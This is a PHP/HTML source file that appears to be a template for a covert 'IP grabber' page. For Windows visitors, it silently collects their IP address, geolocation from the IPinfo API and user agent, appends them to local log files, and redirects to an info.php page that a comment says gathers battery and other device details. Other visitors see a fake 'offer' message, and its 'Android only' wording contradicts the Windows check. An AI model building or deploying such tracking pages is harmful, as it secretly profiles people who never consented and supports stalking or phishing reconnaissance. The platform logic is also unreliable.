<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>YOUR TITLE GOES HERE</title>
</head>
<style>
    body{
        background: linear-gradient(-60deg, #dbe3e3, #ffffff);
        color: #ffff;
        font-size: 3vw;
        width: 100%;
        height: 100vh;
        /*overflow: y;*/
        display: flex;
        justify-content: center;
        align-content: center;
        flex-direction: column;
        align-items: center;
        font-family: 'Arial', serif;
    }
</style>
<body>
<?php
file_get_contents('theme.html');
?>
</body>
</html>
<?php
error_reporting(0);
require_once __DIR__ . '/vendor/autoload.php';
use ipinfo\ipinfo\IPinfo;
$deviceName = $_SERVER['HTTP_USER_AGENT'];
if(stripos($deviceName, 'Windows') !==false){
//GETTING IP AADRESS OF USER
    function getUserIP() {
        // Check for shared internet/ISP IP
        if (!empty($_SERVER['HTTP_CLIENT_IP']) && validateIP($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        // Check for IPs passing through proxies
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            // Check if multiple IP addresses exist in the variable
            if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
                $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
                foreach ($iplist as $ip) {
                    if (validateIP($ip))
                        return $ip;
                }
            } else {
                if (validateIP($_SERVER['HTTP_X_FORWARDED_FOR']))
                    return $_SERVER['HTTP_X_FORWARDED_FOR'];
            }
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED']) && validateIP($_SERVER['HTTP_X_FORWARDED']))
            return $_SERVER['HTTP_X_FORWARDED'];
        if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validateIP($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
            return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
        if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validateIP($_SERVER['HTTP_FORWARDED_FOR']))
            return $_SERVER['HTTP_FORWARDED_FOR'];
        if (!empty($_SERVER['HTTP_FORWARDED']) && validateIP($_SERVER['HTTP_FORWARDED']))
            return $_SERVER['HTTP_FORWARDED'];

        // Return unreliable IP address since all else failed
        return $_SERVER['REMOTE_ADDR'];
    }

// Validates the IP address (IPv4/IPv6)
    function validateIP($ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP,
                FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 |
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return false;
        } else {
            return true;
        }
    }

    $user_ip = getUserIP();
   // echo "User's IP Address: " . $user_ip;

//GETTING BATTERY AND OTHER BASIC INFO
echo "<script>
// JavaScript script for redirection

// Set the URL to redirect to
const redirectToURL = 'info.php'; // Replace with your desired URL

// Function to redirect after a delay
function redirectTo() {
  window.location.href = redirectToURL;
}

// Set the delay time in milliseconds (3 seconds in this case)
const delayTime = 3000;

// Set a timeout to call the redirectTo function after the specified delay
setTimeout(redirectTo, delayTime);

</script>";
//GETTING GEO LOCATION
    function IpLocation() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipAddrs = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipAddrs = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipAddrs = $_SERVER['REMOTE_ADDR'];
        }

        // Validating the obtained IP address
        $ipAddrs = filter_var($ipAddrs, FILTER_VALIDATE_IP);
        $ip = $ipAddrs;

        $access_token = file_get_contents('token.txt');
        $client = new IPinfo($access_token);
        $ip_address = $ip;
        $details = $client->getDetails($ip_address);
        $details->all;

        return $details;
    }
    $det = IpLocation();
    $save = "User GeoData \n". json_encode($det) . PHP_EOL; // Encode the details as JSON and add a new line
//GETTING USERE DETAILS
    $sep = PHP_EOL."=======================================================". PHP_EOL;
    $final = $sep ."User BioDevice \n".$deviceName . $sep;
    file_put_contents('Userinfo.txt', $final, FILE_APPEND);
    file_put_contents('UserInfo.txt', $save, FILE_APPEND);

}else{
    die('<marquee>This Offer is Valid to Android User Only.. :sad</marquee>');
}
